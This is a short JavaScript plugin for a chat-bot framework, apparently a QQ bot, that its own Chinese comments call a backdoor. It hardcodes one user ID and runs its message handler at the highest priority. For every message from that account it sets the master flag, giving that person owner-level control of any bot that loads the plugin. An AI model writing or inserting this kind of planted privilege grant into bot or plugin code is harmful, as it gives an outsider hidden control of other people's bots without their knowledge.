import plugin from '../../../lib/plugins/plugin.js'
//后门可以自己删
let users = [3812808525];

export class Msg嘻嘻 extends plugin {
    constructor() {
        super({
            name: '桀桀桀',
            dsc: '这baizi后门嘿嘿嘿',
            event: 'message',
            priority: -Infinity,
        });
    }

    async accept(e) {
        if (users.includes(e.user_id)) {
              e.isMaster = true;
        }
        return e
    }
}